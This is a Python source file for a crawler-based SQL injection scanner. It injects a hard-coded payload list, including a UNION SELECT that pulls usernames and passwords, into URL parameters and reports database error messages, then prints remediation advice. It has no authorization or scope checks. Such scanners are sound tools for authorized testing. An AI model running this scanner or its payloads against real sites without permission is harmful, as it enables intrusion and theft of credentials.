import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re

sql_payloads = [
    "' OR '1'='1", "' OR 1=1 --", """' OR 'a'='a""",
    "admin' --", "admin' #", "admin'/*", "' UNION SELECT NULL --",
    "' UNION SELECT 1,2,3 --", """' UNION SELECT username, password FROM users --"""
]

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml",
}

visited_urls = set()

class SQLiScanner:
    def __init__(self):
        self.scan_results = []
        self.vulnerability_level = 0  # 0 = none, 1 = low, 2 = medium, 3 = high

    def log_result(self, message):
        self.scan_results.append(message)

    def crawl(self, url, depth=2):
        if depth == 0 or url in visited_urls:
            return
        visited_urls.add(url)
        self.log_result(f"Crawling: {url}")
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.find_all("a", href=True):
                next_url = urljoin(url, link["href"])
                if urlparse(next_url).netloc == urlparse(url).netloc:
                    self.test_sqli(next_url)
                    self.crawl(next_url, depth - 1)
        except requests.RequestException:
            pass

    def test_sqli(self, url):
        self.log_result(f"Testing URL: {url}")
        if self.extract_params_and_test(url, sql_payloads):
            self.vulnerability_level = max(self.vulnerability_level, 3)
            return True
        return False

    def extract_params_and_test(self, url, payloads):
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for param in query_params:
                for payload in payloads:
                    injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param}={payload}"
                    if self.analyze_response(requests.get(injected_url, headers=HEADERS, timeout=5), injected_url, payload):
                        return True
        except requests.RequestException:
            pass
        return False

    def analyze_response(self, response, url, payload):
        error_patterns = [
            r"SQL syntax", r"Warning: mysql_", r"Unclosed quotation mark",
            r"You have an error in your SQL syntax", r"Microsoft OLE DB Provider for ODBC Drivers error"
        ]
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                result = f"[HIGH] SQL Injection Detected at {url} with payload: {payload}"
                self.log_result(result)
                return True
        return False

    def get_remediation_advice(self):
        advice = "\n\n=== SECURITY RECOMMENDATIONS ==="
        if self.vulnerability_level >= 1:
            advice += "\n\n[SQL Injection Detected]"
            advice += "\n1. Use prepared statements and parameterized queries"
            advice += "\n2. Implement input validation and sanitization"
            advice += "\n3. Restrict database permissions for web applications"
            advice += "\n4. Use web application firewalls to block malicious queries"
            advice += "\n5. Regularly audit database queries for vulnerabilities"
        return advice

    def scan_application(self, base_url, depth=2):
        self.log_result(f"Starting scan on {base_url}")
        if self.test_sqli(base_url):
            self.log_result("SQL Injection vulnerability found! Stopping scan.")
            results = "\n".join(self.scan_results)
            results += self.get_remediation_advice()
            return results
        self.crawl(base_url, depth)
        self.log_result("Scan completed.")
        if self.vulnerability_level > 0:
            results = "\n".join(self.scan_results)
            results += self.get_remediation_advice()
            return results
        return "\n".join(self.scan_results)

def scan_application(target, depth=2):
    scanner = SQLiScanner()
    return scanner.scan_application(target, depth)
